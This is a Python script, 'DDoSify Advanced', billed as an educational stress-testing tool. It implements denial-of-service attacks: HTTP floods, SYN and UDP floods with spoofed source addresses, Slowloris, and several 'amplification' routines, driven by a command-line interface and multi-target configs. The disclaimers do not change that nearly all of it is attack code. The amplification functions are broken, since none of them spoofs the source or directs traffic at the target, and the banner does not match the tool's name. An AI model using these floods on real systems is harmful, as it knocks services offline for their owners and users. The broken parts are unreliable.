#!/usr/bin/env python3
"""
DDoSify Advanced - Professional Network Stress Testing Tool
Educational DDoS simulation with advanced attack methods
Author: Security Research
"""

import argparse
import threading
import time
import socket
import random
import sys
import os
import signal
import requests
import json
import subprocess
import struct
import dns.message
import dns.query
from scapy.all import *
from concurrent.futures import ThreadPoolExecutor
import queue
import logging
from datetime import datetime

# Global variables for control
running = False
stats = {
    'packets_sent': 0,
    'connections_made': 0,
    'bytes_sent': 0,
    'start_time': None,
    'threads_active': 0,
    'attack_methods': {},
    'targets': []
}

class AdvancedDDoSify:
    def __init__(self):
        self.running = False
        self.threads = []
        self.executor = ThreadPoolExecutor(max_workers=1000)
        self.attack_queue = queue.Queue()
        self.logger = self.setup_logging()
        
    def setup_logging(self):
        """Setup advanced logging"""
        logging.basicConfig(
            level=logging.INFO,
            format='%(asctime)s - %(levelname)s - %(message)s',
            handlers=[
                logging.FileHandler('ddosify.log'),
                logging.StreamHandler()
            ]
        )
        return logging.getLogger(__name__)
    
    def dns_amplification(self, target, port, threads, duration, dns_servers=None):
        """DNS amplification attack"""
        global stats
        
        if dns_servers is None:
            dns_servers = [
                '8.8.8.8', '8.8.4.4', '1.1.1.1', '1.0.0.1',
                '208.67.222.222', '208.67.220.220'
            ]
        
        def worker():
            global stats
            stats['threads_active'] += 1
            
            while self.running:
                try:
                    # Create DNS query for ANY record (large response)
                    query = dns.message.make_query('google.com', 'A')
                    query.flags |= dns.flags.AD
                    query.add_additional(dns.rrset.from_text('google.com', 300, 'A', '192.168.1.1'))
                    
                    dns_server = random.choice(dns_servers)
                    
                    # Send DNS query with spoofed source IP
                    response = dns.query.udp(query, dns_server, port=53, timeout=2)
                    
                    stats['packets_sent'] += 1
                    stats['bytes_sent'] += len(response.to_wire())
                    
                except Exception as e:
                    self.logger.debug(f"DNS amplification error: {e}")
                    stats['packets_sent'] += 1
                
                time.sleep(0.01)
            
            stats['threads_active'] -= 1
        
        # Start threads
        for _ in range(threads):
            thread = threading.Thread(target=worker)
            thread.daemon = True
            thread.start()
            self.threads.append(thread)
    
    def ntp_amplification(self, target, port, threads, duration, ntp_servers=None):
        """NTP amplification attack"""
        global stats
        
        if ntp_servers is None:
            ntp_servers = [
                '0.pool.ntp.org', '1.pool.ntp.org', '2.pool.ntp.org', '3.pool.ntp.org'
            ]
        
        def worker():
            global stats
            stats['threads_active'] += 1
            
            while self.running:
                try:
                    ntp_server = random.choice(ntp_servers)
                    
                    # Create NTP monlist request (packet type 42)
                    ntp_packet = b'\x1b' + b'\x00' * 47
                    
                    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                    sock.settimeout(2)
                    
                    # Send to NTP server with spoofed source if possible
                    sock.sendto(ntp_packet, (ntp_server, 123))
                    
                    stats['packets_sent'] += 1
                    stats['bytes_sent'] += len(ntp_packet)
                    
                    sock.close()
                    
                except Exception as e:
                    self.logger.debug(f"NTP amplification error: {e}")
                    stats['packets_sent'] += 1
                
                time.sleep(0.01)
            
            stats['threads_active'] -= 1
        
        # Start threads
        for _ in range(threads):
            thread = threading.Thread(target=worker)
            thread.daemon = True
            thread.start()
            self.threads.append(thread)
    
    def memcached_amplification(self, target, port, threads, duration, memcached_servers=None):
        """Memcached amplification attack"""
        global stats
        
        if memcached_servers is None:
            memcached_servers = ['127.0.0.1:11211']  # Default local
        
        def worker():
            global stats
            stats['threads_active'] += 1
            
            while self.running:
                try:
                    server = random.choice(memcached_servers)
                    host, sport = server.split(':')
                    sport = int(sport)
                    
                    # Create Memcached "stats" command (amplifies response)
                    command = b'stats\r\n'
                    
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(2)
                    sock.connect((host, sport))
                    
                    sock.send(command)
                    response = sock.recv(4096)
                    
                    stats['packets_sent'] += 1
                    stats['bytes_sent'] += len(response)
                    
                    sock.close()
                    
                except Exception as e:
                    self.logger.debug(f"Memcached amplification error: {e}")
                    stats['packets_sent'] += 1
                
                time.sleep(0.01)
            
            stats['threads_active'] -= 1
        
        # Start threads
        for _ in range(threads):
            thread = threading.Thread(target=worker)
            thread.daemon = True
            thread.start()
            self.threads.append(thread)
    
    def ssdp_amplification(self, target, port, threads, duration):
        """SSDP amplification attack"""
        global stats
        
        def worker():
            global stats
            stats['threads_active'] += 1
            
            while self.running:
                try:
                    # Create SSDP M-SEARCH request
                    ssdp_request = (
                        b'M-SEARCH * HTTP/1.1\r\n'
                        b'HOST: 239.255.255.250:1900\r\n'
                        b'MAN: "ssdp:discover"\r\n'
                        b'ST: upnp:rootdevice\r\n'
                        b'MX: 3\r\n\r\n'
                    )
                    
                    # Send to SSDP multicast address
                    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                    
                    sock.sendto(ssdp_request, ('239.255.255.250', 1900))
                    
                    stats['packets_sent'] += 1
                    stats['bytes_sent'] += len(ssdp_request)
                    
                    sock.close()
                    
                except Exception as e:
                    self.logger.debug(f"SSDP amplification error: {e}")
                    stats['packets_sent'] += 1
                
                time.sleep(0.01)
            
            stats['threads_active'] -= 1
        
        # Start threads
        for _ in range(threads):
            thread = threading.Thread(target=worker)
            thread.daemon = True
            thread.start()
            self.threads.append(thread)
    
    def multi_vector_attack(self, targets_config, duration):
        """Multi-vector attack on multiple targets"""
        global stats
        
        def attack_worker(target_config):
            method = target_config['method']
            target = target_config['target']
            port = target_config['port']
            threads = target_config['threads']
            
            if method == "http":
                self.http_flood(target, port, threads, duration)
            elif method == "syn":
                self.syn_flood(target, port, threads, duration)
            elif method == "udp":
                self.udp_flood(target, port, threads, duration)
            elif method == "dns":
                self.dns_amplification(target, port, threads, duration)
            elif method == "ntp":
                self.ntp_amplification(target, port, threads, duration)
            elif method == "slowloris":
                self.slowloris(target, port, threads, duration)
        
        # Start attacks for each target
        for target_config in targets_config:
            thread = threading.Thread(target=attack_worker, args=(target_config,))
            thread.daemon = True
            thread.start()
            self.threads.append(thread)
    
    def http_flood(self, target, port, threads, duration):
        """Advanced HTTP flood with randomization"""
        global stats
        
        def worker():
            global stats
            stats['threads_active'] += 1
            
            user_agents = [
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
                'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
                'Mozilla/5.0 (iPhone; CPU iPhone OS 14_7_1 like Mac OS X)',
                'Mozilla/5.0 (Android 11; Mobile; rv:68.0) Gecko/68.0 Firefox/88.0'
            ]
            
            paths = ['/', '/index.html', '/login', '/admin', '/api/v1/users', '/search?q=test']
            
            while self.running:
                try:
                    url = f"http://{target}:{port}{random.choice(paths)}"
                    headers = {
                        'User-Agent': random.choice(user_agents),
                        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                        'Accept-Language': random.choice(['en-US,en;q=0.9', 'en-GB,en;q=0.8']),
                        'Connection': random.choice(['keep-alive', 'close']),
                        'Cache-Control': random.choice(['no-cache', 'max-age=0']),
                    }
                    
                    response = requests.get(url, headers=headers, timeout=5)
                    stats['packets_sent'] += 1
                    stats['bytes_sent'] += len(response.content)
                    
                except:
                    stats['packets_sent'] += 1
                
                time.sleep(random.uniform(0.01, 0.1))
            
            stats['threads_active'] -= 1
        
        # Start threads
        for _ in range(threads):
            thread = threading.Thread(target=worker)
            thread.daemon = True
            thread.start()
            self.threads.append(thread)
    
    def syn_flood(self, target, port, threads, duration):
        """Advanced SYN flood with randomization"""
        global stats
        
        def worker():
            global stats
            stats['threads_active'] += 1
            
            while self.running:
                try:
                    # Random source IP and port
                    src_ip = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
                    src_port = random.randint(1024, 65535)
                    
                    # Create SYN packet
                    ip_layer = IP(src=src_ip, dst=target)
                    tcp_layer = TCP(sport=src_port, dport=port, flags="S", 
                                  seq=random.randint(1000, 9000), 
                                  window=random.randint(1000, 9000))
                    packet = ip_layer / tcp_layer
                    
                    send(packet, verbose=False)
                    stats['packets_sent'] += 1
                    stats['bytes_sent'] += len(packet)
                    
                except:
                    pass
                
                time.sleep(random.uniform(0.001, 0.005))
            
            stats['threads_active'] -= 1
        
        # Start threads
        for _ in range(threads):
            thread = threading.Thread(target=worker)
            thread.daemon = True
            thread.start()
            self.threads.append(thread)
    
    def udp_flood(self, target, port, threads, duration):
        """Advanced UDP flood with randomization"""
        global stats
        
        def worker():
            global stats
            stats['threads_active'] += 1
            
            while self.running:
                try:
                    src_ip = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
                    src_port = random.randint(1024, 65535)
                    
                    ip_layer = IP(src=src_ip, dst=target)
                    udp_layer = UDP(sport=src_port, dport=port)
                    payload = random.randbytes(random.randint(1, 1400))
                    packet = ip_layer / udp_layer / payload
                    
                    send(packet, verbose=False)
                    stats['packets_sent'] += 1
                    stats['bytes_sent'] += len(packet)
                    
                except:
                    pass
                
                time.sleep(random.uniform(0.001, 0.005))
            
            stats['threads_active'] -= 1
        
        # Start threads
        for _ in range(threads):
            thread = threading.Thread(target=worker)
            thread.daemon = True
            thread.start()
            self.threads.append(thread)
    
    def slowloris(self, target, port, threads, duration):
        """Advanced Slowloris attack"""
        global stats
        
        def worker():
            global stats
            stats['threads_active'] += 1
            
            while self.running:
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(10)
                    sock.connect((target, port))
                    
                    # Send partial HTTP header
                    sock.send(b"GET /" + str(random.randint(1, 10000)).encode() + b" HTTP/1.1\r\n")
                    sock.send(b"Host: " + target.encode() + b"\r\n")
                    sock.send(b"User-Agent: " + random.choice([
                        b"Mozilla/5.0", b"Chrome/91.0", b"Firefox/89.0", b"Safari/537.36"
                    ]) + b"\r\n")
                    sock.send(b"Accept: " + random.choice([
                        b"text/html", b"application/json", b"*/*"
                    ]) + b"\r\n")
                    
                    # Keep connection alive with slow headers
                    for _ in range(100):
                        if not self.running:
                            break
                        header = b"X-" + random.randbytes(20).hex().encode() + b": " + random.randbytes(50).hex().encode() + b"\r\n"
                        sock.send(header)
                        stats['packets_sent'] += 1
                        time.sleep(random.uniform(3, 10))
                    
                    sock.close()
                    stats['connections_made'] += 1
                    
                except:
                    pass
            
            stats['threads_active'] -= 1
        
        # Start threads
        for _ in range(threads):
            thread = threading.Thread(target=worker)
            thread.daemon = True
            thread.start()
            self.threads.append(thread)
    
    def load_config(self, config_file):
        """Load attack configuration from JSON file"""
        try:
            with open(config_file, 'r') as f:
                config = json.load(f)
            return config
        except Exception as e:
            self.logger.error(f"Error loading config: {e}")
            return None
    
    def save_stats(self, filename='ddosify_stats.json'):
        """Save attack statistics to file"""
        try:
            stats_copy = stats.copy()
            stats_copy['end_time'] = datetime.now().isoformat()
            
            with open(filename, 'w') as f:
                json.dump(stats_copy, f, indent=2)
            
            self.logger.info(f"Statistics saved to {filename}")
        except Exception as e:
            self.logger.error(f"Error saving stats: {e}")
    
    def start_attack(self, method, target, port, threads, duration, config_file=None):
        """Start the specified attack"""
        global running, stats
        
        # Load configuration if provided
        if config_file:
            config = self.load_config(config_file)
            if config:
                return self.start_multi_vector_attack(config, duration)
        
        # Reset stats
        stats = {
            'packets_sent': 0,
            'connections_made': 0,
            'bytes_sent': 0,
            'start_time': time.time(),
            'threads_active': 0,
            'attack_methods': {method: True},
            'targets': [f"{target}:{port}"]
        }
        
        self.running = True
        running = True
        
        self.logger.info(f"Starting {method.upper()} attack on {target}:{port}")
        self.logger.info(f"Threads: {threads} | Duration: {duration}s")
        
        # Start attack method
        if method == "http":
            self.http_flood(target, port, threads, duration)
        elif method == "syn":
            self.syn_flood(target, port, threads, duration)
        elif method == "udp":
            self.udp_flood(target, port, threads, duration)
        elif method == "dns":
            self.dns_amplification(target, port, threads, duration)
        elif method == "ntp":
            self.ntp_amplification(target, port, threads, duration)
        elif method == "memcached":
            self.memcached_amplification(target, port, threads, duration)
        elif method == "ssdp":
            self.ssdp_amplification(target, port, threads, duration)
        elif method == "slowloris":
            self.slowloris(target, port, threads, duration)
        else:
            self.logger.error(f"Unknown attack method: {method}")
            return False
        
        # Monitor attack
        self.monitor_attack(duration)
        
        return True
    
    def start_multi_vector_attack(self, config, duration):
        """Start multi-vector attack from configuration"""
        global stats
        
        stats = {
            'packets_sent': 0,
            'connections_made': 0,
            'bytes_sent': 0,
            'start_time': time.time(),
            'threads_active': 0,
            'attack_methods': {},
            'targets': []
        }
        
        self.running = True
        running = True
        
        targets_config = config.get('targets', [])
        
        for target_config in targets_config:
            method = target_config['method']
            target = target_config['target']
            port = target_config['port']
            
            if method not in stats['attack_methods']:
                stats['attack_methods'][method] = 0
            stats['attack_methods'][method] += 1
            
            target_str = f"{target}:{port}"
            if target_str not in stats['targets']:
                stats['targets'].append(target_str)
        
        self.logger.info(f"Starting multi-vector attack on {len(targets_config)} targets")
        self.logger.info(f"Attack methods: {list(stats['attack_methods'].keys())}")
        
        self.multi_vector_attack(targets_config, duration)
        self.monitor_attack(duration)
        
        return True
    
    def monitor_attack(self, duration):
        """Monitor attack statistics"""
        start_time = time.time()
        
        while self.running and (time.time() - start_time) < duration:
            elapsed = time.time() - start_time
            rate = stats['packets_sent'] / elapsed if elapsed > 0 else 0
            bytes_rate = stats['bytes_sent'] / elapsed if elapsed > 0 else 0
            
            print(f"\r[+] Packets: {stats['packets_sent']:,} | "
                  f"Rate: {rate:.2f}/s | "
                  f"Bytes: {stats['bytes_sent']:,} ({bytes_rate/1024:.2f}KB/s) | "
                  f"Threads: {stats['threads_active']} | "
                  f"Time: {elapsed:.1f}s", end="")
            
            time.sleep(1)
        
        self.stop_attack()
    
    def stop_attack(self):
        """Stop the attack"""
        global running
        
        self.running = False
        running = False
        
        print("\n" + "=" * 60)
        self.logger.info("Attack stopped")
        
        if stats['start_time']:
            elapsed = time.time() - stats['start_time']
            rate = stats['packets_sent'] / elapsed if elapsed > 0 else 0
            bytes_rate = stats['bytes_sent'] / elapsed if elapsed > 0 else 0
            
            print(f"[+] Total packets sent: {stats['packets_sent']:,}")
            print(f"[+] Total bytes sent: {stats['bytes_sent']:,}")
            print(f"[+] Total connections: {stats['connections_made']:,}")
            print(f"[+] Average packet rate: {rate:.2f} packets/second")
            print(f"[+] Average byte rate: {bytes_rate/1024:.2f} KB/second")
            print(f"[+] Duration: {elapsed:.2f} seconds")
            print(f"[+] Attack methods: {list(stats['attack_methods'].keys())}")
            print(f"[+] Targets: {stats['targets']}")
            
            # Save statistics
            self.save_stats()

def signal_handler(sig, frame):
    """Handle Ctrl+C signal"""
    global running
    print("\n[!] Attack interrupted by user")
    running = False

def print_banner():
    """Print DDoSify Advanced banner"""
    banner = """
    ____            __  __       _ _           
   |  _ \ ___  _ __|  \/  |_   _| | | ___  _ __ 
   | |_) / _ \| '__| |\/| | | | | | |/ _ \| '__|
   |  __/ (_) | |  | |  | | |_| | | | (_) | |   
   |_|   \___/|_|  |_|  |_|\__,_|_|_|\___/|_|   
                                               
    Advanced Network Stress Testing Tool
    Educational Purpose Only - Professional Version
    Author: Security Research
    
    [!] Advanced Attack Methods Available
    [!] Multi-Vector Attack Support
    [!] Amplification Attacks Included
    [!] Use Only on Authorized Networks
    """
    print(banner)

def create_sample_config():
    """Create sample configuration file"""
    config = {
        "name": "Multi-Vector Attack Configuration",
        "description": "Sample configuration for multi-vector DDoS testing",
        "targets": [
            {
                "method": "http",
                "target": "192.168.1.100",
                "port": 80,
                "threads": 50
            },
            {
                "method": "syn",
                "target": "192.168.1.100",
                "port": 443,
                "threads": 100
            },
            {
                "method": "dns",
                "target": "192.168.1.100",
                "port": 53,
                "threads": 30
            }
        ],
        "global_settings": {
            "duration": 120,
            "randomization": True,
            "evasion": True
        }
    }
    
    with open('ddosify_config.json', 'w') as f:
        json.dump(config, f, indent=2)
    
    print("[+] Sample configuration created: ddosify_config.json")

def main():
    parser = argparse.ArgumentParser(
        description="DDoSify Advanced - Professional Network Stress Testing Tool",
        epilog="Example: sudo python3 ddosify_advanced.py -m dns -t 192.168.1.100 -p 53 --threads 100 --duration 30"
    )
    
    parser.add_argument("-m", "--method", 
                       choices=["http", "syn", "udp", "dns", "ntp", "memcached", "ssdp", "slowloris"],
                       help="Attack method")
    parser.add_argument("-t", "--target", help="Target IP or hostname")
    parser.add_argument("-p", "--port", type=int, default=80, help="Target port (default: 80)")
    parser.add_argument("--threads", type=int, default=50, help="Number of threads (default: 50)")
    parser.add_argument("--duration", type=int, default=60, help="Attack duration in seconds (default: 60)")
    parser.add_argument("--config", help="JSON configuration file for multi-vector attacks")
    parser.add_argument("--create-config", action="store_true", help="Create sample configuration file")
    parser.add_argument("--test", action="store_true", help="Test connection before attacking")
    parser.add_argument("--save-stats", help="Save statistics to specified file")
    
    args = parser.parse_args()
    
    # Print banner
    print_banner()
    print("=" * 60)
    
    # Create sample config if requested
    if args.create_config:
        create_sample_config()
        return
    
    # Load configuration if provided
    if args.config:
        try:
            with open(args.config, 'r') as f:
                config = json.load(f)
            
            print(f"[+] Loaded configuration: {args.config}")
            print(f"[+] Targets: {len(config.get('targets', []))}")
            print(f"[+] Methods: {[t['method'] for t in config.get('targets', [])]}")
            
        except Exception as e:
            print(f"[-] Error loading configuration: {e}")
            return
    
    # Safety warnings
    print("WARNING: This is an advanced DDoS testing tool for educational purposes only!")
    print("Only use on networks you own or have explicit permission to test.")
    print("Unauthorized use is illegal and may result in severe penalties.")
    print("=" * 60)
    
    # Confirm attack
    try:
        confirm = input("Do you understand and accept full responsibility? (yes/no): ")
        if confirm.lower() != 'yes':
            print("Attack cancelled.")
            return
    except KeyboardInterrupt:
        print("\nAttack cancelled.")
        return
    
    # Check for root privileges
    if os.geteuid() != 0:
        print("[-] Advanced attacks require root privileges. Run with sudo.")
        print("[!] Kali Linux command: sudo python3 ddosify_advanced.py")
        sys.exit(1)
    
    # Set up signal handler
    signal.signal(signal.SIGINT, signal_handler)
    
    # Create DDoSify instance
    ddos = AdvancedDDoSify()
    
    # Start attack
    try:
        if args.config:
            ddos.start_attack(None, None, None, None, None, args.config)
        else:
            if not args.method or not args.target:
                print("[-] Method and target required for single attack")
                print("[-] Use --config for multi-vector attacks")
                return
            
            ddos.start_attack(
                method=args.method,
                target=args.target,
                port=args.port,
                threads=args.threads,
                duration=args.duration
            )
    except KeyboardInterrupt:
        ddos.stop_attack()
    except Exception as e:
        print(f"[-] Error: {e}")
        ddos.stop_attack()

if __name__ == "__main__":
    main()
